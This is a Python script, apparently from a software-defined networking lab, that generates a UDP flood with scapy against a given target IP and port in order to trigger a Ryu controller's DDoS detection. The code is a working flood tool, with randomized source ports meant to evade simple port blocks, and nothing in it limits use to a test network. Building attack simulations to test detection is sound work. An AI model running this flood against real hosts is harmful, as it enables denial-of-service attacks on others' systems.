#!/usr/bin/env python3
"""
DDoS Attack Simulation Script

Data Plane / Traffic Generation Component

This script simulates a volumetric UDP flood attack originating from a Mininet host.
It uses scapy to generate packets with randomized source ports to mimic complex
botnet behavior, triggering the telemetry detection of the Ryu controller.
"""

import argparse
import random
import time
from scapy.all import IP, UDP, Raw, send

def main():
    parser = argparse.ArgumentParser(description="Volumetric UDP Flood DDoS Simulation")
    parser.add_argument("--target", required=True, help="Target IP address (Victim)")
    parser.add_argument("--port", type=int, default=80, help="Target destination port (default: 80)")
    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    
    print(f"[*] Starting UDP flood attack against {target_ip}:{target_port}")
    print("[*] Press Ctrl+C to stop.")

    # Payload for the UDP packets to add some volume
    payload = b"X" * 1024  # 1KB payload

    packet_count = 0
    start_time = time.time()

    try:
        while True:
            # Randomize source port for every packet to simulate botnet behavior
            # and bypass simple stateless port blocks.
            src_port = random.randint(1024, 65535)

            # Construct the packet
            packet = IP(dst=target_ip) / UDP(sport=src_port, dport=target_port) / Raw(load=payload)

            # Send the packet (verbose=0 to suppress scapy's default output)
            send(packet, verbose=0)
            
            packet_count += 1

            # Print status every 1000 packets
            if packet_count % 1000 == 0:
                elapsed_time = time.time() - start_time
                pps = packet_count / elapsed_time
                print(f"[+] Sent {packet_count} packets to {target_ip}:{target_port} (Rate: {pps:.2f} pps)")

    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped. Total packets sent: {packet_count}")

if __name__ == "__main__":
    main()
